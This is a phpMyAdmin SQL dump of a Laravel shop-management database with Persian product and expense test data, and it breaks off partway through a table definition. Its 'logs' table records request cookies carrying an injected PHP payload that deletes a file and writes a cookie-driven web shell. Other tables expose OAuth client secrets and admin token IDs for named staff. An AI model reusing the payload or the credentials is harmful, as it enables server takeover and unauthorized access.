-- phpMyAdmin SQL Dump
-- version 4.7.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 01, 2017 at 02:23 AM
-- Server version: 10.1.24-MariaDB
-- PHP Version: 7.1.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `Shop_Soft2`
--

-- --------------------------------------------------------

--
-- Table structure for table `Category`
--

CREATE TABLE `Category` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Category`
--

INSERT INTO `Category` (`id`, `name`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 'لباس', NULL, NULL, NULL),
(2, 'test', '2017-06-27 20:58:53', '2017-06-27 20:58:53', NULL),
(4, 'great!', '2017-06-29 21:07:31', '2017-06-29 21:07:31', NULL),
(5, 'دسته جدید', '2017-06-29 21:07:46', '2017-06-29 21:07:46', NULL),
(6, 'لففتاتابابلیل', '2017-06-29 21:08:32', '2017-06-29 21:08:32', NULL),
(7, 'test', '2017-06-29 22:10:00', '2017-06-29 22:10:00', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `Expense`
--

CREATE TABLE `Expense` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `price` double NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Expense`
--

INSERT INTO `Expense` (`id`, `title`, `price`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 'test', 12, '2017-06-28 11:52:59', '2017-06-28 11:52:59', NULL),
(2, 'tst', 232, '2017-06-30 11:15:19', '2017-06-30 11:15:19', NULL),
(3, 'SolDio', 1010, '2017-06-30 16:28:52', '2017-06-30 16:28:52', NULL),
(4, 'SolDio', 1010, '2017-06-30 16:29:38', '2017-06-30 16:29:38', NULL),
(6, 'سگ تو پروژه', 121, '2017-06-30 18:52:31', '2017-06-30 18:52:31', NULL),
(7, 'ایمان اومده اتاق', 12, '2017-06-30 18:55:49', '2017-06-30 18:55:49', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `Factors`
--

CREATE TABLE `Factors` (
  `id` int(10) UNSIGNED NOT NULL,
  `seller` int(10) UNSIGNED NOT NULL,
  `date` date DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Factors`
--

INSERT INTO `Factors` (`id`, `seller`, `date`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(2, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(3, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(4, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(5, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(6, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(7, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(8, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(9, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(10, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(11, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(12, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(13, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(14, 1, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(15, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(16, 2, '2017-06-28', '2017-06-27 19:30:00', NULL, NULL),
(17, 1, '2017-06-28', '2017-06-27 20:20:24', '2017-06-27 20:20:24', NULL),
(18, 1, '2017-06-28', '2017-06-27 20:22:04', '2017-06-27 20:22:04', NULL),
(19, 1, '2017-06-28', '2017-06-27 20:23:13', '2017-06-27 20:23:13', NULL),
(20, 1, '2017-06-28', '2017-06-27 20:23:48', '2017-06-27 20:23:48', NULL),
(21, 1, '2017-05-27', '2017-06-27 20:39:19', '2017-06-27 20:39:19', NULL),
(22, 1, '2017-05-27', '2017-06-27 20:41:23', '2017-06-27 20:41:23', NULL),
(23, 1, '2017-05-27', '2017-06-27 20:43:09', '2017-06-27 20:43:09', NULL),
(24, 1, '2017-05-27', '2017-06-27 20:44:22', '2017-06-27 20:44:22', NULL),
(25, 1, '2017-05-27', '2017-06-27 20:45:06', '2017-06-27 20:45:06', NULL),
(26, 1, '2017-05-27', '2017-06-27 20:46:48', '2017-06-27 20:46:48', NULL),
(27, 1, '2017-05-27', '2017-06-27 20:47:50', '2017-06-27 20:47:50', NULL),
(28, 1, '2017-05-27', '2017-06-27 20:49:08', '2017-06-27 20:49:08', NULL),
(29, 1, '2017-05-27', '2017-06-27 20:50:10', '2017-06-27 20:50:10', NULL),
(30, 1, '2017-10-10', '2017-06-29 22:08:17', '2017-06-29 22:08:17', NULL),
(31, 1, '2017-10-10', '2017-06-29 22:08:51', '2017-06-29 22:08:51', NULL),
(32, 2, '2017-10-10', '2017-06-29 22:19:23', '2017-06-29 22:19:23', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE `logs` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` text COLLATE utf8_unicode_ci,
  `description` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `logs`
--

INSERT INTO `logs` (`id`, `title`, `description`, `created_at`, `updated_at`, `deleted_at`) VALUES
(3, 'Test Log 1', '[1498789566][2017-06-30 02:26:06][INFO]: URL: http://shop.com/api/users , METHOD: GET , HEADER: {\"cache-control\":[\"no-cache\"],\"postman-token\":[\"02bf5b3a-ede6-4036-83cd-96f90dbcf9de\"],\"cookie\":[\"ari_lang=() { :%3b};php -r \'set_time_limit(0);unlink(\\\"page.f', '2017-06-30 02:26:06', NULL, NULL),
(4, 'Test Log 2', '[1498789605][2017-06-30 02:26:45][INFO]: URL: http://shop.com/api/users , METHOD: GET , HEADER: {\"host\":[\"shop.com\"],\"connection\":[\"keep-alive\"],\"upgrade-insecure-requests\":[\"1\"],\"user-agent\":[\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\\/537.3', '2017-06-30 02:26:45', NULL, NULL),
(5, 'Test Log 3', '[1498789747][2017-06-30 02:29:07][INFO]: URL: http://shop.com/api/users , METHOD: GET , HEADER: {\"cache-control\":[\"no-cache\"],\"postman-token\":[\"e175c6c5-e880-4772-b08e-4e898b3c200d\"],\"cookie\":[\"ari_lang=() { :%3b};php -r \'set_time_limit(0);unlink(\\\"page.framework.php\\\");file_put_contents(\\\"misc\\/audio.php\\\", \\\"<?php if(\\\\$_COOKIE[\\\\\\\"lang\\\\\\\"]) {system(\\\\$_COOKIE[\\\\\\\"lang\\\\\\\"]);}die();?>\\\");\';ari_auth=a%3A2%3A%7Bi%3A0%3Bs%3A88%3A%22xuyV19I%2F5g9VAzqkL3mCvvVuv7x8CegAVZt0EhCNdLXXZW9FAiEMbF3SHsK%2F0ULg28rMrRULamL%2FDXUdBjSc3Q%3D%3D%22%3Bi%3A1%3Bs%3A32%3A%229bbef5d712d6f9e052cdbf6eb32de6fe%22%3B%7D\"],\"user-agent\":[\"PostmanRuntime\\/3.0.9\"],\"accept\":[\"*\\/*\"],\"host\":[\"shop.com\"],\"accept-encoding\":[\"gzip, deflate\"],\"connection\":[\"keep-alive\"]} , PARAM: [{\"user\":\"as\",\"pass\":\"ddd\"}] , FROM: 172.17.59.94', '2017-06-30 02:29:07', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1),
(3, '2016_06_01_000001_create_oauth_auth_codes_table', 1),
(4, '2016_06_01_000002_create_oauth_access_tokens_table', 1),
(5, '2016_06_01_000003_create_oauth_refresh_tokens_table', 1),
(6, '2016_06_01_000004_create_oauth_clients_table', 1),
(7, '2016_06_01_000005_create_oauth_personal_access_clients_table', 1),
(8, '2017_05_12_233725_Factors_Table', 1),
(9, '2017_05_12_233728_Category_Table', 1),
(10, '2017_05_12_233729_SubCategory_Table', 1),
(11, '2017_05_12_233730_Product_Table', 1),
(12, '2017_05_12_233731_Property_Table', 1),
(13, '2017_05_12_233733_ProductProperty_Table', 1),
(14, '2017_05_12_233735_Expense_Table', 1),
(15, '2017_05_12_233738_Order_Table', 1),
(16, '2017_05_13_105025_OrderFactor_table', 1),
(17, '2017_06_29_200616_create_l_o_gs_table', 2);

-- --------------------------------------------------------

--
-- Table structure for table `oauth_access_tokens`
--

CREATE TABLE `oauth_access_tokens` (
  `id` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `client_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `scopes` text COLLATE utf8_unicode_ci,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `oauth_access_tokens`
--

INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('054893063e7e11d70c391cf9f0e4838cfee7ba13fff3c5c8494de48d1d87a08087143d60d247de11', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 0, '2017-06-30 21:39:19', '2017-06-30 21:39:19', '2018-07-01 02:09:19'),
('0f3a21661c6af02bc3736966dc8fcea923851c46bc74e4a2b3bfe40923ec91a36f6eb00fcd12fd1a', 1, 2, NULL, '[]', 1, '2017-05-25 11:11:58', '2017-05-25 11:11:58', '2018-05-25 15:41:58'),
('15b6f70b4f53a67cab67429a7f3a1a1af0787ac10d02be4244172443e5464d1bdef2ab9e54f7ecf8', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:19:06', '2017-06-30 21:19:06', '2018-07-01 01:49:06'),
('194cd28acb38d6e0f7085bc3a7cf28a6658f413f063847a46d64262c42fe47d0e9ba82187e02dfae', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 14:46:28', '2017-06-30 14:46:28', '2018-06-30 19:16:28'),
('2e7dc6d114afec8a5029a1d64e126342d27d9727adfad1c58a89750394c1259be08c48a49fe7cd5e', 3, 1, 'Ali Hakimi Token', '[\"accountant\"]', 1, '2017-06-30 14:47:32', '2017-06-30 14:47:32', '2018-06-30 19:17:32'),
('2ea8f97e46a55ecaf9752cca84e2509236f6a520e8a834d890abec283a975fafce9ba0ae583358b1', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:32:30', '2017-06-30 21:32:30', '2018-07-01 02:02:30'),
('32cca58d59bacb2455a0e07befb962b92a0f88e5dcc8690be0cba21f4cc8a366bcfb36a07201ac5f', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 14:41:46', '2017-06-30 14:41:46', '2018-06-30 19:11:46'),
('330d78649c807a96e39371082ae18c248ce304b9925e3fa83128df3eb1f928180d8731a4e586f063', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:28:18', '2017-06-30 21:28:18', '2018-07-01 01:58:18'),
('3a33105416bfec81bb9954e3990c65ad79805b24d3dacbea4289de736e45cfeaf3bf0ed4c699ad6f', 1, 4, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-05-25 13:57:41', '2017-05-25 13:57:41', '2018-05-25 18:27:41'),
('6bad68c12e3bab3234d870881e0ef96a53a12be36261ebe57a46923ba165d60197088c524f066fa6', 2, 1, 'Mohammad Sepahvand Token', '[\"stockman\"]', 0, '2017-06-30 21:52:09', '2017-06-30 21:52:09', '2018-07-01 02:22:09'),
('6dd23b468b628e891b754c5404500c2c7549a412e8c656ee41229b6daf14ddcf196feddc42570f93', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:20:41', '2017-06-30 21:20:41', '2018-07-01 01:50:41'),
('707e0c8b2eceb38cddefa981b13c3b07daf9010e7303fa1b79354349faa96a1d1d84eb098191caf9', 2, 1, 'Mohammad Sepahvand Token', '[\"stockman\"]', 1, '2017-06-30 14:46:57', '2017-06-30 14:46:57', '2018-06-30 19:16:57'),
('71c1b2a0a89799c4496aac8d848a8b4a4945e9026867f0a28bd2ee9a3d06e32829d508175c6d1742', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:36:39', '2017-06-30 21:36:39', '2018-07-01 02:06:39'),
('88dd06c7ec1ba126b9cc69146b13424164cec2c405844e8d3e0b7f10e98e36e40f3c91135497eac3', 3, 1, 'Ali Hakimi Token', '[\"accountant\"]', 0, '2017-06-30 20:40:09', '2017-06-30 20:40:09', '2018-07-01 01:10:09'),
('94b1187b4f2db74a39a4ae01ad063fbf88d73debb06a99e8c4925ecc48374702be42feb6323882b1', 2, 1, 'Mohammad Sepahvand Token', '[\"stockman\"]', 1, '2017-06-30 14:49:30', '2017-06-30 14:49:30', '2018-06-30 19:19:30'),
('a8dacd0a4403293878b1840829e76fbf5653dcd5ecfd7cbcff5cc326cc2021d89574d7cf390e5db2', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:33:37', '2017-06-30 21:33:37', '2018-07-01 02:03:37'),
('af6d85b5efb48ad02f88cb60c9a5acc2a7f81aab66c013f92b6a638c04d306ee687aa42cdb19e5ab', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:19:46', '2017-06-30 21:19:46', '2018-07-01 01:49:46'),
('c8db38f2e692b3ea4833d3292ae29cb5b79bc06a4589bcf785a23d6fdc5e0220952cf186c03be98c', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:30:03', '2017-06-30 21:30:03', '2018-07-01 02:00:03'),
('ce9dd3e6f723f350420ebd2fc15a7238a0662e96c70adeb145e990f033c4f574015c1118be501064', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:25:11', '2017-06-30 21:25:11', '2018-07-01 01:55:11'),
('ceec2fc22546166a52c03b31bce0a82eab7a9300a89c992371b29c1b5dc9ad86d1afc7069675dd52', 2, 1, 'Mohammad Sepahvand Token', '[\"stockman\"]', 1, '2017-06-30 14:47:46', '2017-06-30 14:47:46', '2018-06-30 19:17:46'),
('dd1a6556a3b43135fbd367b0900f581d6bcad9ba822751ce022366539896b5d3d681807356fd3f71', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:23:45', '2017-06-30 21:23:45', '2018-07-01 01:53:45'),
('e192162748f55a2ee1d63f779725b6ef8448581f7ada04c7d15ef879dfd82976df6d886e12ed6b83', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:19:56', '2017-06-30 21:19:56', '2018-07-01 01:49:56'),
('f1f68d865c73950d7f1d86ee7479e78bef716c41d70f92151b841a111d0cc98007d83b7c864a4aa9', 1, 1, 'Alireza Karami Token', '[\"admin\"]', 1, '2017-06-30 21:35:59', '2017-06-30 21:35:59', '2018-07-01 02:05:59');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_auth_codes`
--

CREATE TABLE `oauth_auth_codes` (
  `id` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `client_id` int(11) NOT NULL,
  `scopes` text COLLATE utf8_unicode_ci,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `oauth_clients`
--

CREATE TABLE `oauth_clients` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `secret` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `redirect` text COLLATE utf8_unicode_ci NOT NULL,
  `personal_access_client` tinyint(1) NOT NULL,
  `password_client` tinyint(1) NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `oauth_clients`
--

INSERT INTO `oauth_clients` (`id`, `user_id`, `name`, `secret`, `redirect`, `personal_access_client`, `password_client`, `revoked`, `created_at`, `updated_at`) VALUES
(1, NULL, 'Laravel Personal Access Client', 'U98ZUwsxSoa7r5puZcCPVD3A1BuMjd8POMIHnLk0', 'http://localhost', 1, 0, 0, '2017-05-25 10:48:09', '2017-05-25 10:48:09'),
(2, NULL, 'Laravel Password Grant Client', '1Jloa5IASxAQttIo4sd0zOKR7Ra2sKb29YBkJDRU', 'http://localhost', 0, 1, 0, '2017-05-25 10:48:09', '2017-05-25 10:48:09'),
(4, 1, 'Alireza Karami Client', 'N9GIqizqwMPok1X0xbeUBL4H522KrjX1fp2EpIX6', 'http://localhost', 1, 0, 0, '2017-05-25 13:56:45', '2017-05-25 13:56:45'),
(5, 2, 'Mohammad Sepahvand Client', 'cgDs0g9ABO5FK6AVLgzh9i0TWP6LxoYbjQ0RgI1P', 'http://localhost', 1, 0, 0, '2017-06-30 14:46:57', '2017-06-30 14:46:57'),
(6, 3, 'Ali Hakimi Client', 'IWQtD7PNO8LBREfNRZHUBioDF2jDwMAI54Qlfsb0', 'http://localhost', 1, 0, 0, '2017-06-30 14:47:32', '2017-06-30 14:47:32');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_personal_access_clients`
--

CREATE TABLE `oauth_personal_access_clients` (
  `id` int(10) UNSIGNED NOT NULL,
  `client_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `oauth_personal_access_clients`
--

INSERT INTO `oauth_personal_access_clients` (`id`, `client_id`, `created_at`, `updated_at`) VALUES
(1, 1, '2017-05-25 10:48:09', '2017-05-25 10:48:09');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_refresh_tokens`
--

CREATE TABLE `oauth_refresh_tokens` (
  `id` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `access_token_id` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `oauth_refresh_tokens`
--

INSERT INTO `oauth_refresh_tokens` (`id`, `access_token_id`, `revoked`, `expires_at`) VALUES
('007cf937f070d1e21bc2daa25ba04fcb8f678411fdb3251b3d649ef8691243ca88666f4d53043ac5', '0f3a21661c6af02bc3736966dc8fcea923851c46bc74e4a2b3bfe40923ec91a36f6eb00fcd12fd1a', 0, '2018-05-25 15:41:58');

-- --------------------------------------------------------

--
-- Table structure for table `Order`
--

CREATE TABLE `Order` (
  `id` int(10) UNSIGNED NOT NULL,
  `product` int(10) UNSIGNED NOT NULL,
  `count` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `orderFactor` int(10) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Order`
--

INSERT INTO `Order` (`id`, `product`, `count`, `orderFactor`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 22, 10, 1, NULL, NULL, NULL),
(2, 1, 12, 3, NULL, NULL, NULL),
(3, 2, 20, 1, NULL, NULL, NULL),
(4, 1, 20, 3, NULL, NULL, NULL),
(5, 2, 1, 13, NULL, NULL, NULL),
(6, 15, 1, 14, NULL, NULL, NULL),
(7, 15, 1, 15, NULL, NULL, NULL),
(8, 34, 1, 15, NULL, NULL, NULL),
(9, 2, 1, 15, NULL, NULL, NULL),
(10, 37, 2, 15, NULL, NULL, NULL),
(11, 35, 3, 15, NULL, NULL, NULL),
(12, 6, 1, 15, NULL, NULL, NULL),
(13, 16, 3, 15, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `OrderFactor`
--

CREATE TABLE `OrderFactor` (
  `id` int(10) UNSIGNED NOT NULL,
  `status` int(10) UNSIGNED NOT NULL DEFAULT '2',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `OrderFactor`
--

INSERT INTO `OrderFactor` (`id`, `status`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 1, NULL, NULL, NULL),
(2, 2, NULL, NULL, NULL),
(3, 1, NULL, NULL, NULL),
(4, 1, NULL, NULL, NULL),
(6, 2, '2017-06-30 13:18:58', '2017-06-30 13:18:58', NULL),
(7, 2, '2017-06-30 13:19:33', '2017-06-30 13:19:33', NULL),
(8, 2, '2017-06-30 13:22:04', '2017-06-30 13:22:04', NULL),
(9, 1, '2017-06-30 13:25:53', '2017-06-30 13:25:53', NULL),
(10, 1, '2017-06-30 13:26:38', '2017-06-30 13:26:38', NULL),
(11, 1, '2017-06-30 13:27:46', '2017-06-30 13:27:46', NULL),
(12, 1, '2017-06-30 13:30:29', '2017-06-30 13:30:29', NULL),
(13, 1, '2017-06-30 13:33:39', '2017-06-30 13:33:39', NULL),
(14, 1, '2017-06-30 17:48:59', '2017-06-30 17:48:59', NULL),
(15, 1, '2017-06-30 18:25:35', '2017-06-30 18:25:35', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `OrderStatus`
--

CREATE TABLE `OrderStatus` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `OrderStatus`
--

INSERT INTO `OrderStatus` (`id`, `name`, `deleted_at`) VALUES
(1, 'Payed', NULL),
(2, 'Cancelled', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `Product`
--

CREATE TABLE `Product` (
  `code` int(10) UNSIGNED NOT NULL,
  `factor` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `category` int(10) UNSIGNED NOT NULL,
  `subcategory` int(10) UNSIGNED NOT NULL,
  `count` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `buyPrice` double NOT NULL DEFAULT '0',
  `sellPrice` double NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Product`
--

INSERT INTO `Product` (`code`, `factor`, `name`, `category`, `subcategory`, `count`, `buyPrice`, `sellPrice`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 1, 'شلوار جیم - پارچه s', 1, 1, 5, 500000, 700000, NULL, '2017-06-29 01:51:16', NULL),
(2, 1, 'gfd', 1, 1, 12, 14, 15, '2017-06-28 06:33:44', '2017-06-28 06:33:44', NULL),
(3, 1, 'test ali karam', 2, 2, 1, 2, 4, '2017-06-28 06:45:13', '2017-06-29 02:05:44', '2017-06-29 02:05:44'),
(4, 1, 'test', 1, 1, 1, 2, 4, '2017-06-28 06:45:19', '2017-06-28 06:45:19', NULL),
(5, 1, 'test', 1, 1, 1, 2, 4, '2017-06-28 06:45:23', '2017-06-30 04:22:45', '2017-06-30 04:22:45'),
(6, 2, 'test', 1, 1, 1, 2, 4, '2017-06-28 06:54:43', '2017-06-28 06:54:43', NULL),
(15, 2, 'test', 1, 1, 12, 14, 12, '2017-06-28 18:10:09', '2017-06-28 18:10:09', NULL),
(16, 2, 'test', 1, 1, 12, 14, 12, '2017-06-28 18:12:00', '2017-06-28 18:12:00', NULL),
(17, 2, 'test', 1, 1, 12, 14, 12, '2017-06-28 18:14:47', '2017-06-30 04:16:52', '2017-06-30 04:16:52'),
(18, 2, 'test', 1, 1, 12, 14, 12, '2017-06-28 18:17:22', '2017-06-30 04:22:41', '2017-06-30 04:22:41'),
(19, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-28 18:17:31', '2017-06-30 04:22:33', '2017-06-30 04:22:33'),
(20, 1, 'test', 1, 1, 12, 23, 12, '2017-06-28 18:34:32', '2017-06-30 04:22:29', '2017-06-30 04:22:29'),
(21, 1, 'test', 1, 1, 12, 23, 12, '2017-06-28 18:37:34', '2017-06-30 04:22:23', '2017-06-30 04:22:23'),
(22, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-28 18:40:17', '2017-06-30 04:21:54', '2017-06-30 04:21:54'),
(23, 1, 'test', 1, 1, 12, 23, 12, '2017-06-28 18:46:19', '2017-06-30 04:21:26', '2017-06-30 04:21:26'),
(24, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-28 18:46:33', '2017-06-30 04:21:00', '2017-06-30 04:21:00'),
(25, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-28 18:46:39', '2017-06-30 04:20:00', '2017-06-30 04:20:00'),
(26, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-28 18:57:57', '2017-06-30 04:18:17', '2017-06-30 04:18:17'),
(27, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-28 18:58:23', '2017-06-30 04:18:10', '2017-06-30 04:18:10'),
(28, 1, 'test', 1, 1, 12, 23, 12, '2017-06-28 18:58:29', '2017-06-30 04:16:44', '2017-06-30 04:16:44'),
(29, 1, '2اصل جنس', 1, 1, 12, 14, 15, '2017-06-29 01:20:43', '2017-06-30 04:16:18', '2017-06-30 04:16:18'),
(30, 2, '154', 1, 1, 16, 1214, 14, '2017-06-29 22:25:35', '2017-06-30 03:19:48', '2017-06-30 03:19:48'),
(31, 1, 'new', 1, 1, 14, 12, 14, '2017-06-29 22:26:58', '2017-06-30 03:20:18', '2017-06-30 03:20:18'),
(32, 1, 'test', 1, 1, 14, 14, 14, '2017-06-29 22:36:13', '2017-06-29 23:54:15', '2017-06-29 23:54:15'),
(33, 1, 'test', 1, 1, 5, 12, 14, '2017-06-29 22:36:53', '2017-06-29 23:54:10', '2017-06-29 23:54:10'),
(34, 30, 'شلوار', 1, 1, 12, 145000, 1000, '2017-06-30 17:31:36', '2017-06-30 17:31:36', NULL),
(35, 2, 'طناب', 1, 1, 95, 1364, 14563, '2017-06-30 17:33:22', '2017-06-30 18:47:23', NULL),
(36, 2, 'روبیک2', 4, 1, 95, 1212, 256, '2017-06-30 17:35:39', '2017-06-30 18:47:14', NULL),
(37, 1, 'سلام', 1, 1, 95, 1000, 500, '2017-06-30 17:38:01', '2017-06-30 18:47:08', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `ProductProperty`
--

CREATE TABLE `ProductProperty` (
  `id` int(10) UNSIGNED NOT NULL,
  `product` int(10) UNSIGNED NOT NULL,
  `property` int(10) UNSIGNED NOT NULL,
